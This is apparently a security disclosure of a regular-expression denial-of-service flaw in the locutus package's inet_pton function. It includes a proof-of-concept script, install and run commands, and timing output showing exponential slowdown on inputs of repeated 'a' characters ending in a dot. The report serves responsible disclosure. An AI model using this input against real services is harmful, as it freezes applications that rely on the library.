# Description

`locutus` is vulnerable to `ReDoS`. The regular expression at src/php/network/inet_pton.js:24 is vulnerable to ReDoS. It is possible to cause increasing slow-downs which lock the event loop by passing strings which have some number of repeating a characters followed by a . character. For example: aaaaaaaaaaaa.


# Proof of Concept

1. Create the following PoC file:

```js
// poc.js
const inet_pton = require('locutus/php/network/inet_pton');
console.log('starting')
for (let i=4; i < 40; i++)
{
    const str = new Array(i).fill('a').join('') + '.';
    const start = + new Date();

    inet_pton(str);

    const elapsed = (+ new Date()) - start;
   
    console.log('i=' + i + ' elapsed (seconds): ' + elapsed / 1000);
}
```

2. Execute the following commands in another terminal:

```bash
npm i locutus # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
starting                       
i=4 elapsed (seconds): 0
i=5 elapsed (seconds): 0
i=6 elapsed (seconds): 0
i=7 elapsed (seconds): 0                   
i=8 elapsed (seconds): 0
i=9 elapsed (seconds): 0                                            
i=10 elapsed (seconds): 0.001
i=11 elapsed (seconds): 0                                           
i=12 elapsed (seconds): 0                                                                                                                             
i=13 elapsed (seconds): 0
i=14 elapsed (seconds): 0                             
i=15 elapsed (seconds): 0.002                                       
i=16 elapsed (seconds): 0.003                                                                                                                         
i=17 elapsed (seconds): 0.006
i=18 elapsed (seconds): 0.01
i=19 elapsed (seconds): 0.018
i=20 elapsed (seconds): 0.031
i=21 elapsed (seconds): 0.054
i=22 elapsed (seconds): 0.094
i=23 elapsed (seconds): 0.158
i=24 elapsed (seconds): 0.266
i=25 elapsed (seconds): 0.439
i=26 elapsed (seconds): 0.714
i=27 elapsed (seconds): 1.132
i=28 elapsed (seconds): 1.757
i=29 elapsed (seconds): 2.713
i=30 elapsed (seconds): 3.976
i=31 elapsed (seconds): 5.761
i=32 elapsed (seconds): 7.99
i=33 elapsed (seconds): 10.899
i=34 elapsed (seconds): 14.411
i=35 elapsed (seconds): 18.608
i=36 elapsed (seconds): 23.983
i=37 elapsed (seconds): 28.913
i=38 elapsed (seconds): 34.088
i=39 elapsed (seconds): 38.999
```
